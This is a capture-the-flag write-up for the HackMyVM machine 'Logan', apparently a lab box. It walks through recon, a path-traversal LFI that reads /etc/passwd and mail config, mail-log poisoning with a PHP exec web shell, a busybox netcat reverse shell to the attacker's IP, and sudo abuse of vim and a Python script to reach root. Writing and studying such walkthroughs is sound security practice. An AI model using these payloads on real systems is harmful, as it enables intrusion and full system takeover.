# Logan

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.159:25
Open 10.0.2.159:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.159
PORT   STATE SERVICE REASON  VERSION
25/tcp open  smtp    syn-ack Postfix smtpd
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=logan
| Subject Alternative Name: DNS:logan
| Issuer: commonName=logan
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-07-03T13:46:49
| Not valid after:  2033-06-30T13:46:49
| MD5:   9b0d:3da4:7274:a99c:8b9e:705a:122f:249f
| SHA-1: ef60:c55c:e4bf:e99a:c4bb:3281:f2c4:ded5:d44b:4801
| -----BEGIN CERTIFICATE-----
| MIIC7DCCAdSgAwIBAgIUAlr/UnIZGJp5n3bGtfiPosfmoh4wDQYJKoZIhvcNAQEL
| BQAwEDEOMAwGA1UEAwwFbG9nYW4wHhcNMjMwNzAzMTM0NjQ5WhcNMzMwNjMwMTM0
| NjQ5WjAQMQ4wDAYDVQQDDAVsb2dhbjCCASIwDQYJKoZIhvcNAQEBBQADggEPADCC
| AQoCggEBALA1lkF4fnRQLkvBGoCsRJlInBrwk8yxe8jWue068b2Q7Ti3rNtGhf6G
| Ze7FX1Yjb5NH1KTTcqumNb/nAxv9hMl4Dc50MC2hSWq6qMnqOrkb+AI16bVuhYcm
| SLGsuq7bPGflyhfoIK8Cj0xXvZS65D68pBhoZ/7Oji5rGMfngnrcJ2Q36Ctimm8b
| UK+exEWSgbC12xd2f/noFWBPrB7EC5XHMYARVV6/I17aajheOqEKBTDL0AkSqzKT
| /snWlz7vjMGjJsNIZ6o6wZUYxqXzFDXnInyQ7k+IPXcDDp7V3TOZAB6jQwZhdH2o
| 1+CGuwBbCWvV+kAGvlTotL7k9RN5F/cCAwEAAaM+MDwwCQYDVR0TBAIwADAQBgNV
| HREECTAHggVsb2dhbjAdBgNVHQ4EFgQUeVAVq//+vvbEd+bXwnPsAxY6HxAwDQYJ
| KoZIhvcNAQELBQADggEBADScL3LqV9/XFprgMf6GOz8y2lvbkOSADTvFHUQiBcqp
| /K/LWCXRtHJVkJA5z5+IMAFWGfueBffgdZLnKtyCLfUtsMqqqoVR0BXlzPys1Jhm
| Ri4Ra9KVvH7pxt69kD+3xk7Hz8jyHQVfXWGmPZ/li6OOQxKei69CwDqTvcvjyNyc
| lcix3P+eTIDcnWHFu2wkOew8+q7Mza7IzfIy6u3qs5Lqccv1fMDhDYMQ2j5iGEo9
| SZMyBUTRqR2nmX8wuL6wYHcmvfWp0Px3bAXxaqz2p96W3XTqPECTJ45rcfRsdbFB
| SIh86N9X05gerFhkaKhczHfR1hjtyUb1LltfRhbh7cY=
|_-----END CERTIFICATE-----
|_smtp-commands: logan.hmv, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
80/tcp open  http    syn-ack Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
Service Info: Host:  logan.hmv
```
:::

## HTTP

Requires hostname `logan.hmv`, add to DNS

![writeup.png](/assets/pentest/hackmyvm/logan/writeup.png)

Landing page, probably no more content.

Enumerate subdomains
```bash
â””â”€$ domain='logan.hmv'; ffuf -u "http://$domain/" -H "Host: FUZZ.$domain" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -mc all -fs 65
admin                   [Status: 200, Size: 1112, Words: 300, Lines: 63, Duration: 573ms]
```

### LFI

Definitely LFI here

![writeup-1.png](/assets/pentest/hackmyvm/logan/writeup-1.png)

```bash
â””â”€$ ffuf -u 'http://admin.logan.hmv/payments.php' -d 'file=FUZZ' -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -H 'Content-Type: application/x-www-form-urlencoded' -fs 313
<SNIP>
....//....//....//....//etc/passwd [Status: 200, Size: 2254, Words: 46, Lines: 52, Duration: 3ms]
```

Double path traversal for the bypass \o/

```bash
â””â”€$ curl 'http://admin.logan.hmv/payments.php' -d 'file=....//....//....//....//etc/passwd' -s | htmlq pre -t | grep sh$
root:x:0:0:root:/root:/bin/bash
logan:x:1000:1000:logan:/home/logan:/bin/bash
```

```bash
â””â”€$ curl 'http://admin.logan.hmv/payments.php' -d 'file=....//....//....//....//var/log/mail.log' -s | htmlq pre -t | grep conf
Dec 23 20:23:05 logan postfix/master[1559]: daemon started -- version 3.6.4, configuration /etc/postfix

â””â”€$ curl 'http://admin.logan.hmv/payments.php' -d 'file=....//....//....//....//etc/postfix/main.cf' -s | htmlq pre -t | grep -vE '^$|#'
smtpd_banner = $myhostname ESMTP $mail_name (Ubuntu)
biff = no
append_dot_mydomain = no
readme_directory = no
compatibility_level = 3.6
smtpd_tls_cert_file=/etc/ssl/certs/ssl-cert-snakeoil.pem
smtpd_tls_key_file=/etc/ssl/private/ssl-cert-snakeoil.key
smtpd_tls_security_level=may
smtp_tls_CApath=/etc/ssl/certs
smtp_tls_security_level=may
smtp_tls_session_cache_database = btree:${data_directory}/smtp_scache
smtpd_relay_restrictions = permit_mynetworks permit_sasl_authenticated defer_unauth_destination
myhostname = logan.hmv
alias_maps = hash:/etc/aliases
alias_database = hash:/etc/aliases
myorigin = /etc/mailname
mydestination = $myhostname, logan.hmv, logan, localhost.localdomain, localhost
relayhost =
mynetworks = 127.0.0.0/8 [::ffff:127.0.0.0]/104 [::1]/128
mailbox_size_limit = 0
recipient_delimiter = +
inet_interfaces = all
inet_protocols = all
```

- **Identity:** The server identifies as `logan.hmv`.
- **Security (TLS):** It uses "Opportunistic TLS" (`security_level=may`). It will encrypt email if the other server supports it, but it won't force it. Itâ€™s currently using **"Snakeoil" (self-signed) certificates**, which will cause validation warnings in the real world.
- **Relay Rules (The most important part):**
    - It allows anyone on `mynetworks` (localhost) to send mail through it.
    - It **blocks** outsiders from using it as an "Open Relay" (`defer_unauth_destination`).
- **Delivery:** Itâ€™s set to receive mail for `logan.hmv` and `localhost`. There is no `relayhost`, meaning it attempts to deliver mail directly to the destination over the internet.
- **Limits:** `mailbox_size_limit = 0` means there is no cap on mailbox size (risky for disk space).

### RCE

Since log files are readable we can probably poison it for RCE.

We are able to send emails
```bash
â””â”€$ swaks --to www-data@logan.hmv --from logan@logan.hmv --server logan.hmv:25 --header "Subject: ðŸ§™ Unlock the Magic~~" --body 'I found something _mysterious_ at https://letmein.sorcery.htb/user/login â€” please click it, I swear itâ€™s only _mildly_ cursed. ðŸ‘¾'

â””â”€$ curl 'http://admin.logan.hmv/payments.php' -d 'file=....//....//....//....//var/mail/www-data' -s | htmlq pre -t
From logan@logan.hmv  Tue Dec 23 20:52:45 2025
Return-Path:
X-Original-To: www-data@logan.hmv
Delivered-To: www-data@logan.hmv
Received: from kraken (unknown [10.0.2.149])
	by logan.hmv (Postfix) with ESMTP id 106036014E
	for ; Tue, 23 Dec 2025 20:52:45 +0000 (UTC)
Date: Tue, 23 Dec 2025 15:52:45 -0500
To: www-data@logan.hmv
From: logan@logan.hmv
Subject: ðŸ§™ Unlock the Magic~~
Message-Id: <20251223155245.226075@kraken>
X-Mailer: swaks v20240103.0 jetmore.org/john/code/swaks/

I found something _mysterious_ at https://letmein.sorcery.htb/user/login â€” please click it, I swear itâ€™s only _mildly_ cursed. ðŸ‘¾
```

```bash
â””â”€$ swaks --to www-data@logan.hmv --from logan@logan.hmv --server logan.hmv:25 --header "Subject: ðŸ§™ Unlock the Magic~~" --body '<?php if(isset($_REQUEST[0])) { @system($_REQUEST[0]); } ?>'
# Requests fail

â””â”€$ swaks --to www-data@logan.hmv --from logan@logan.hmv --server logan.hmv:25 --header "Subject: ðŸ§™ Unlock the Magic~~" --body '<?php echo phpinfo(); ?>'

â””â”€$ curl 'http://admin.logan.hmv/payments.php' -d 'file=....//....//....//....//var/mail/www-data' -s | htmlq pre -t | grep disable_
disable_classesno valueno value
disable_functionssystem,Â shell_execsystem,Â shell_exec

â””â”€$ swaks --to www-data@logan.hmv --from logan@logan.hmv --server logan.hmv:25 --header "Subject: ðŸ§™ Unlock the Magic~~" --body '<?php if(isset($_REQUEST[1])) { @exec($_REQUEST[1]); } ?>'
```

```bash
â””â”€$ curl 'http://admin.logan.hmv/payments.php' -d 'file=....//....//....//....//var/mail/www-data' --data-urlencode '1=busybox nc 10.0.2.149 4444 -e /bin/bash' -s | htmlq pre -t
---
â””â”€$ penelope -p 4444
www-data@logan:/var/www/admin$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Lateral Movement

```bash
www-data@logan:/var/www/admin$ sudo -l
Matching Defaults entries for www-data on logan:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User www-data may run the following commands on logan:
    (logan) NOPASSWD: /usr/bin/vim
```

```bash
www-data@logan:/var/www/admin$ sudo -u logan vim -c ':!/bin/bash'
logan@logan:/var/www/admin$ id
uid=1000(logan) gid=1000(logan) groups=1000(logan),27(sudo),1002(administration)
```

### User.txt

```bash
logan@logan:~$ cat user.txt
User: ilovelogs
```

## Privilege Escalation

```bash
logan@logan:~$ sudo -l
Matching Defaults entries for logan on logan:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User logan may run the following commands on logan:
    (root) NOPASSWD: /usr/bin/python3 /opt/learn_some_python.py
```

```bash
logan@logan:~$ sudo python3 /opt/learn_some_python.py
Welcome!!!

 The first you need to now is how to use print, please type print('hello')

import os; os.system("/bin/bash -p")

root@logan:/home/logan# id
uid=0(root) gid=0(root) groups=0(root)
```

### Root.txt

```bash
root@logan:/home/logan# cat /root/root.txt
Root: siuuuuuuuu
```